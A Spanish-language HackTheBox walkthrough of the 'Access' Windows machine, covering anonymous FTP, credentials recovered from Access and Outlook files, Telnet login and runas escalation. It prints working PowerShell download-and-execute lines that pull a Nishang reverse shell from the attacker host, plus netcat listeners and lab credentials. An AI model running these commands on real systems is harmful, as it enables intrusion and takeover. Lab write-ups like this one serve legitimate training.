# Access

![](../../../../~gitbook/image.md)Publicado: 18 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Access es una máquina Windows de dificultad fácil de HackTheBox que nos enseña la importancia de una enumeración exhaustiva y el manejo de credenciales. El vector de ataque inicial involucra el acceso a un servicio FTP anónimo que contiene archivos de backup sensibles. A través del análisis de una base de datos Microsoft Access y un archivo PST de Outlook, obtendremos credenciales válidas que nos permitirán conectarnos via Telnet. La escalada de privilegios se logra explotando credenciales guardadas en el sistema utilizando el comando `runas`.Técnicas utilizadas:- Enumeración de servicios FTP anónimos
- Análisis de bases de datos Microsoft Access (.mdb)
- Extracción y análisis de archivos PST de Outlook
- Explotación de credenciales guardadas con runas
- Reverse shells con PowerShell

### 🔭 Reconocimiento

#### 🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🚀 Escaneo de puertos

#### 🔍 Enumeración de servicios
🎯 Servicios identificados:- Puerto 21: FTP con acceso anónimo habilitado
- Puerto 23: Servicio Telnet
- Puerto 80: Servidor web IIS 7.5

### 🌐 Enumeración de Servicios

#### 📁 Puerto 21 - FTP Anónimo
Durante la enumeración descubrimos que el servicio FTP permite autenticación anónima. Procedemos a enumerar el contenido:🗂️ Directorio Backups🔧 Directorio EngineerAlternativa para descarga recursiva:
#### 🔐 Análisis de Archivos Descargados
Archivos obtenidos:🗃️ Análisis del archivo backup.mdbUtilizamos la herramienta online https://www.mdbopener.com/es.html para analizar la base de datos:![](../../../../~gitbook/image.md)📊 Tabla auth_user encontrada:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)🔑 Credenciales obtenidas:- engineer: access4u@security
- backup_admin: admin
- admin: 55th
🔓 Descompresión del archivo ZIPUsamos la contraseña `access4u@security` para descomprimir el archivo:📧 Análisis del archivo PSTUtilizamos https://goldfynch.com para analizar el archivo PST y encontramos:![](../../../../~gitbook/image.md)🔐 Nueva credencial encontrada:- Usuario: security
- Contraseña: 4Cc3ssC0ntr0ller

#### 🌍 Puerto 80 - HTTP (IIS 7.5)
![](../../../../~gitbook/image.md)El sitio web no presenta vectores de ataque evidentes y el fuzzing de directorios no revela rutas interesantes.
### 🚀 Explotación - Acceso Inicial

#### 📞 Conexión via Telnet
Utilizamos las credenciales encontradas para conectarnos al servicio Telnet:
#### 🔄 Estableciendo Reverse Shell
Preparación del payload PowerShell:Descargamos el script de Nishang:Añadimos al final del script:Ejecución desde Telnet:Reverse shell establecida:
#### 🏁 Flag de Usuario

### 📈 Escalada de Privilegios

#### 🔍 Enumeración del Sistema
Verificación de privilegios:
#### 🛠️ Enumeración Automatizada con JAWS

#### 🔐 Credenciales Guardadas Encontradas
![](../../../../~gitbook/image.md)🎯 Vector de escalada identificado: Credenciales de Administrator guardadas en el sistema.
#### 👑 Explotación con runas
Shell de Administrator obtenida:
#### 🎖️ Flag de Root
![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🚀 Explotación - Acceso Inicial](#explotacion-acceso-inicial)
- [📈 Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.98
PING 10.10.10.98 (10.10.10.98) 56(84) bytes of data.
64 bytes from 10.10.10.98: icmp_seq=1 ttl=127 time=50.9 ms
64 bytes from 10.10.10.98: icmp_seq=2 ttl=127 time=59.0 ms

--- 10.10.10.98 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 50.919/54.971/59.023/4.052 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.98 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
21,23,80
```

```
nmap -sC -sV -p$ports 10.10.10.98 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 13:16 CEST

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
ftp anonymous@10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
425 Cannot open data connection.
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  09:16PM                 Backups
08-24-18  10:00PM                 Engineer
226 Transfer complete.
```

```
ftp> cd Backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
```

```
ftp> cd Engineer
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Access\ Control.zip
```

```
wget -r --no-passive ftp://10.10.10.98/
```

```
~/Access ❯ ls
'Access Control.zip'   backup.mdb
```

```
file backup.mdb
backup.mdb: Microsoft Access Database
```

```
7z x Access\ Control.zip
Enter password (will not be echoed): access4u@security
Everything is Ok
Size:       271360
Compressed: 10870
```

```
file Access\ Control.pst
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23)
```

```
telnet 10.10.10.98 23
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.

Welcome to Microsoft Telnet Service

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

```
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1 -O shell.ps1
```

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443
```

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/shell.ps1')"
```

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.98] 49160
Windows PowerShell running as user security on ACCESS

PS C:\Users\security>whoami
access\security
```

```
PS C:\Users\security\Desktop> type user.txt
[FLAG_USER_AQUÍ]
```

```
PS C:\Users\security> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
wget https://raw.githubusercontent.com/411Hall/JAWS/refs/heads/master/jaws-enum.ps1
```

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/jaws-enum.ps1 -OutputFileName Jaws-Enum.txt')"
```

```
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.7/shell.ps1')"
```

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.98] 49168
Windows PowerShell running as user Administrator on ACCESS

PS C:\Windows\system32>whoami
access\administrator
```
